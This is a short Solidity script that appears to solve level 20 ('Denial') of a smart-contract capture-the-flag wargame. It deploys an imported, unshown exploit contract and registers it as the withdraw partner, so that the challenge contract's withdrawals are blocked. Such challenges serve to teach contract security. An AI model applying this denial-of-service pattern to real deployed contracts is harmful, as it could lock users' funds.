// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IDenial.sol";
import "../src/exploits/DenialExploit.sol";

contract SolveLevel20 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IDenial instance = IDenial(payable(instanceAddress));
        DenialExploit exploit = new DenialExploit();

        instance.setWithdrawPartner(address(exploit));
    }
}
